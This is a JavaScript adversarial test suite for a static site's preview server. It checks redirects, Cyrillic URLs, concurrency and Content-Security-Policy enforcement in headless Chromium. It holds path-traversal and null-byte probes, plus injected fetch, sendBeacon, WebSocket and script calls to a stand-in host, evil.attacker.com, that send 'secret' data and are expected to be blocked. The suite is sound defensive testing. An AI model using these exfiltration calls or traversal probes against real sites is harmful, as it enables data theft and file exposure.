import http from 'node:http';
import assert from 'node:assert/strict';
import { createPreviewServer, resolvePreviewPrefixes } from '../scripts/preview-public.mjs';
import { withBase } from '../src/client/components/Shell.tsx';
import { validateSiteUrl, resolveSiteBase, buildSeoMeta } from '../scripts/prerender.tsx';
import { chromium } from './e2e/node_modules/playwright/index.mjs';

const TEST_PORT = 3125;
const BASE_URL = `http://127.0.0.1:${TEST_PORT}`;

async function runTestSuite() {
  console.log('=== STARTING ADVERSARIAL STRESS & VERIFICATION SUITE ===\n');

  // Start preview server on isolated test port
  process.env.BASE_PATH = '/steam-cloud-manager/';
  const server = createPreviewServer(TEST_PORT);
  await new Promise(resolve => server.once('listening', resolve));
  console.log(`[INIT] Preview server listening on ${BASE_URL}`);

  const results = {
    total: 0,
    passed: 0,
    failed: 0,
    failures: []
  };

  async function check(name, fn) {
    results.total++;
    try {
      await fn();
      results.passed++;
      console.log(`  ✓ ${name}`);
    } catch (err) {
      results.failed++;
      results.failures.push({ name, error: err });
      console.error(`  ✖ ${name}:`, err.message);
    }
  }

  // =========================================================================
  // SECTION 1: URL CORNER CASES, MALFORMED PATHS, CYRILLIC & REDUNDANT SLASHES
  // =========================================================================
  console.log('\n--- Section 1: URL Corner Cases, Redundant Slashes, Cyrillic & Encoding ---');

  await check('1.1: Exact subpath without trailing slash returns 301 redirect', async () => {
    const res = await fetch(`${BASE_URL}/steam-cloud-manager`, { redirect: 'manual' });
    assert.equal(res.status, 301, 'Must return 301');
    assert.equal(res.headers.get('location'), '/steam-cloud-manager/', 'Must redirect to trailing slash');
  });

  await check('1.2: Redundant leading slashes (//steam-cloud-manager//) handled without crashing', async () => {
    const res = await fetch(`${BASE_URL}//steam-cloud-manager//`, { redirect: 'manual' });
    // Should either return 404 or redirect or resolve, but NEVER 500 or hang
    assert([200, 301, 404].includes(res.status), `Unexpected status: ${res.status}`);
  });

  await check('1.3: Redundant slashes in locale subpath (/steam-cloud-manager///en///) resolves or 404 cleanly', async () => {
    const res = await fetch(`${BASE_URL}/steam-cloud-manager///en///index.html`);
    // Should not crash
    assert([200, 404].includes(res.status));
  });

  await check('1.4: Raw Cyrillic query parameters (/steam-cloud-manager/ru/?поиск=сохранения&lang=ru) returns 200', async () => {
    const res = await fetch(`${BASE_URL}/steam-cloud-manager/ru/?поиск=сохранения&lang=ru`);
    assert.equal(res.status, 200);
    const text = await res.text();
    assert(text.includes('Менеджер сохранений Steam Cloud'));
  });

  await check('1.5: Percent-encoded Cyrillic query parameters returns 200 and UTF-8 content', async () => {
    const query = encodeURIComponent('сохранения');
    const res = await fetch(`${BASE_URL}/steam-cloud-manager/ru/?query=${query}`);
    assert.equal(res.status, 200);
    const text = await res.text();
    assert(text.includes('Менеджер сохранений Steam Cloud'));
  });

  await check('1.6: Cyrillic in URL fragment hash (/steam-cloud-manager/ru/#установка) returns 200', async () => {
    // Note: fragment is client-side, but server URL might be probed with raw string
    const res = await fetch(`${BASE_URL}/steam-cloud-manager/ru/#установка`);
    assert.equal(res.status, 200);
  });

  await check('1.7: Non-existent Cyrillic subpath (/steam-cloud-manager/ru/сохранения/) returns 404 safely', async () => {
    const res = await fetch(`${BASE_URL}/steam-cloud-manager/ru/сохранения/`);
    assert.equal(res.status, 404);
    const body = await res.text();
    assert(!body.includes('/Users/'));
    assert(!body.includes('node_modules'));
  });

  await check('1.8: Deep subpath (/steam-cloud-manager/deep/nested/sub/path/) returns 404 without leakage', async () => {
    const res = await fetch(`${BASE_URL}/steam-cloud-manager/deep/nested/sub/path/`);
    assert.equal(res.status, 404);
    const body = await res.text();
    assert(!body.includes('Error: ENOENT'));
    assert(!body.includes('/Users/'));
  });

  await check('1.9: Malformed URI encoding (%E0%A4%A) caught and returns 404 without unhandled rejection', async () => {
    // %E0%A4%A is an incomplete UTF-8 byte sequence that throws URIError in decodeURIComponent
    const res = await fetch(`${BASE_URL}/%E0%A4%A`);
    assert.equal(res.status, 404, 'Must catch URIError and return 404');
  });

  await check('1.10: Null byte injection (/en/index.html%00.png) rejected safely', async () => {
    const res = await fetch(`${BASE_URL}/steam-cloud-manager/en/index.html%00.png`);
    assert([400, 403, 404].includes(res.status));
  });

  await check('1.11: Path traversal with dot-dot (/../package.json) blocked with 403 or 404', async () => {
    const res = await fetch(`${BASE_URL}/../package.json`);
    assert([403, 404].includes(res.status));
    const text = await res.text();
    assert(!text.includes('"name": "steam-cloud-manager"'));
  });

  await check('1.12: Encoded path traversal (%2e%2e%2fpackage.json) blocked with 403 or 404', async () => {
    const res = await fetch(`${BASE_URL}/%2e%2e%2fpackage.json`);
    assert([403, 404].includes(res.status));
    const text = await res.text();
    assert(!text.includes('"name": "steam-cloud-manager"'));
  });

  await check('1.13: Windows-style backslash traversal (/..\\package.json) blocked with 403 or 404', async () => {
    const res = await fetch(`${BASE_URL}/..\\package.json`);
    assert([403, 404].includes(res.status));
    const text = await res.text();
    assert(!text.includes('"name": "steam-cloud-manager"'));
  });

  // =========================================================================
  // SECTION 2: CONCURRENCY STRESS HARNESS
  // =========================================================================
  console.log('\n--- Section 2: Preview Server Concurrency Stress Harness ---');

  await check('2.1: 200 concurrent requests across varied endpoints with zero crashes', async () => {
    const endpoints = [
      '/steam-cloud-manager/en/',
      '/steam-cloud-manager/ru/',
      '/steam-cloud-manager/en/index.html',
      '/steam-cloud-manager/favicon.svg',
      '/steam-cloud-manager/theme-init.js',
      '/steam-cloud-manager/robots.txt',
      '/steam-cloud-manager/sitemap.xml',
      '/steam-cloud-manager/nonexistent.html',
      '/steam-cloud-manager/deep/404/path',
      '/../package.json',
    ];

    const totalRequests = 200;
    const concurrency = 25;
    const startTime = Date.now();
    let index = 0;
    const responses = [];
    const workers = Array.from({ length: concurrency }, async () => {
      while (index < totalRequests) {
        const i = index++;
        const ep = endpoints[i % endpoints.length];
        const res = await fetch(`${BASE_URL}${ep}`);
        responses.push({ status: res.status, ok: res.status === 200 || res.status === 404 || res.status === 403 });
      }
    });

    await Promise.all(workers);
    const duration = Date.now() - startTime;
    console.log(`    Executed ${totalRequests} concurrent requests in ${duration}ms (avg ${(duration / totalRequests).toFixed(2)}ms/req)`);

    assert.equal(responses.length, totalRequests);
    assert(responses.every(r => r.ok), 'All responses must return valid HTTP status (200, 403, 404)');
  });

  // =========================================================================
  // SECTION 3: CHROMIUM LIVE CSP VIOLATION HANDLING & ATTACK SIMULATION
  // =========================================================================
  console.log('\n--- Section 3: Chromium Live CSP Violation Handling & Attack Simulation ---');

  const browser = await chromium.launch({ headless: true });
  const context = await browser.newContext();
  const page = await context.newPage();

  try {
    const violations = [];
    const consoleErrors = [];

    // Attach CDP / DOM listeners for CSP violations
    await page.exposeFunction('onCspViolation', (ev) => {
      violations.push(ev);
    });

    page.on('console', msg => {
      if (msg.type() === 'error') consoleErrors.push(msg.text());
    });

    await page.addInitScript(() => {
      document.addEventListener('securitypolicyviolation', (e) => {
        window.onCspViolation({
          blockedURI: e.blockedURI,
          violatedDirective: e.violatedDirective,
          effectiveDirective: e.effectiveDirective,
          originalPolicy: e.originalPolicy,
        });
      });
    });

    await check('3.1: Navigate to public static site in Chromium and verify baseline headers', async () => {
      const response = await page.goto(`${BASE_URL}/steam-cloud-manager/en/`);
      assert.equal(response.status(), 200);

      // Verify static CSP meta tag exists in DOM
      const cspMeta = await page.evaluate(() => {
        return document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.getAttribute('content');
      });
      assert(cspMeta, 'CSP meta tag must exist');
      assert(cspMeta.includes("connect-src 'none'"), 'CSP meta must enforce connect-src none');
    });

    await check('3.2: Legitimate assets (JS, CSS, SVGs) loaded cleanly with zero initial CSP violations', async () => {
      assert.equal(violations.length, 0, `Initial load should have 0 CSP violations, found: ${JSON.stringify(violations)}`);
    });

    await check('3.3: Adversarial Attack: Injected fetch() to external domain is blocked by Chromium CSP', async () => {
      const violationCountBefore = violations.length;
      const fetchResult = await page.evaluate(async () => {
        try {
          await fetch('https://evil.attacker.com/leak?data=secret', { mode: 'no-cors' });
          return 'NOT_BLOCKED';
        } catch (e) {
          return e.message;
        }
      });

      // Fetch should reject because connect-src is 'none'
      assert.notEqual(fetchResult, 'NOT_BLOCKED', 'Chromium must block unauthorized fetch');
      // Wait for securitypolicyviolation event
      await page.waitForTimeout(100);
      const violation = violations.find(v => v.effectiveDirective === 'connect-src' || v.violatedDirective?.includes('connect-src'));
      assert(violation, 'Chromium must trigger securitypolicyviolation event for connect-src');
      console.log(`    Captured CSP violation event: effectiveDirective=${violation.effectiveDirective}, blockedURI=${violation.blockedURI}`);
    });

    await check('3.4: Adversarial Attack: Injected navigator.sendBeacon() is blocked by Chromium CSP', async () => {
      await page.evaluate(() => {
        try {
          navigator.sendBeacon('https://evil.attacker.com/beacon', 'leaked_data');
        } catch {
          // ignore
        }
      });
      await page.waitForTimeout(100);
      const beaconViolation = violations.find(v => v.blockedURI.includes('evil.attacker.com/beacon'));
      assert(beaconViolation, 'Chromium must trigger securitypolicyviolation event for blocked sendBeacon');
      console.log(`    Captured beacon CSP violation: directive=${beaconViolation.effectiveDirective}, URI=${beaconViolation.blockedURI}`);
    });

    await check('3.5: Adversarial Attack: Injected WebSocket connection is blocked by Chromium CSP', async () => {
      await page.evaluate(() => {
        try {
          new WebSocket('wss://evil.attacker.com/stream');
        } catch {
          // ignore
        }
      });
      await page.waitForTimeout(100);
      const wsViolation = violations.find(v => v.blockedURI.includes('evil.attacker.com/stream'));
      assert(wsViolation, 'Chromium must trigger securitypolicyviolation event for blocked WebSocket');
      console.log(`    Captured WebSocket CSP violation: directive=${wsViolation.effectiveDirective}, URI=${wsViolation.blockedURI}`);
    });

    await check('3.6: Adversarial Attack: Remote <script src="https://evil.com/evil.js"> is blocked', async () => {
      await page.evaluate(() => {
        const s = document.createElement('script');
        s.src = 'https://evil.attacker.com/malicious.js';
        document.head.appendChild(s);
      });

      await page.waitForTimeout(100);
      const scriptViolation = violations.find(v => v.effectiveDirective === 'script-src' || v.violatedDirective?.includes('script-src'));
      assert(scriptViolation, 'Chromium must block remote script execution under script-src self');
      console.log(`    Captured script CSP violation: blockedURI=${scriptViolation.blockedURI}`);
    });

    await check('3.7: In-page interactivity functions cleanly after attack attempts', async () => {
      // Click theme switcher
      const select = page.getByLabel('Theme', { exact: true });
      await select.selectOption('dark');
      const htmlTheme = await page.getAttribute('html', 'data-theme');
      assert.equal(htmlTheme, 'dark');

      // Click language link
      await page.getByRole('link', { name: 'RU', exact: true }).click();
      await page.waitForURL('**/ru/');
      const htmlLang = await page.getAttribute('html', 'lang');
      assert.equal(htmlLang, 'ru');
    });

  } finally {
    await browser.close();
  }

  // =========================================================================
  // SECTION 4: UNIT LOGIC ADVERSARIAL STRESS (withBase & prerender)
  // =========================================================================
  console.log('\n--- Section 4: Unit Logic Adversarial Stress ---');

  await check('4.1: withBase handles absurd slash repetition (//////steam-cloud-manager//////)', () => {
    process.env.BASE_PATH = '//////steam-cloud-manager//////';
    assert.equal(withBase('/ru/'), '/steam-cloud-manager/ru/');
    assert.equal(withBase('ru/'), '/steam-cloud-manager/ru/');
    assert.equal(withBase('//////ru//////'), '/steam-cloud-manager/ru//////');
  });

  await check('4.2: withBase handles root base path with empty, hash, and query', () => {
    process.env.BASE_PATH = '/';
    assert.equal(withBase(''), '/');
    assert.equal(withBase('/'), '/');
    assert.equal(withBase('#install'), '/#install');
    assert.equal(withBase('/?foo=bar'), '/?foo=bar');
  });

  await check('4.3: withBase handles fully qualified SITE_URL with subpath', () => {
    delete process.env.BASE_PATH;
    process.env.SITE_URL = 'https://famence.github.io/steam-cloud-manager/';
    assert.equal(withBase('/en/'), '/steam-cloud-manager/en/');
    assert.equal(withBase('/assets/main.js'), '/steam-cloud-manager/assets/main.js');
  });

  await check('4.4: validateSiteUrl rejects sneaky URLs with non-https, query, auth, or hash', () => {
    const invalidList = [
      'https://user:password@site.com',
      'https://user@site.com',
      'http://site.com',
      'http://site.com:8080/',
      'https://site.com/?query=1',
      'https://site.com/#hash',
      'ftp://site.com',
      'javascript:alert(1)',
      'data:text/html,evil',
    ];
    for (const url of invalidList) {
      assert.throws(() => validateSiteUrl(url), `Must reject ${url}`);
    }
  });

  await check('4.5: buildSeoMeta Cyrillic escaping preserves multi-byte UTF-8 in title and descriptions', () => {
    const meta = buildSeoMeta('ru', 'https://famence.github.io/steam-cloud-manager', true, "default-src 'self'");
    const ogTitle = meta.find(m => m.includes('property="og:title"'));
    assert(ogTitle.includes('Менеджер сохранений Steam Cloud'), 'Must contain raw Russian characters');
    assert(!ogTitle.includes('&amp;#1052;'), 'Must not entity-encode Cyrillic');
  });

  // Cleanup server
  server.closeAllConnections?.();
  await new Promise(resolve => server.close(resolve));
  console.log('\n[TEARDOWN] Preview server closed cleanly.');

  // Print Summary
  console.log('\n=========================================================');
  console.log(`TOTAL ADVERSARIAL TESTS: ${results.total}`);
  console.log(`PASSED: ${results.passed}`);
  console.log(`FAILED: ${results.failed}`);
  console.log('=========================================================\n');

  if (results.failed > 0) {
    process.exit(1);
  }
}

runTestSuite().catch(err => {
  console.error('FATAL SUITE CRASH:', err);
  process.exit(1);
});
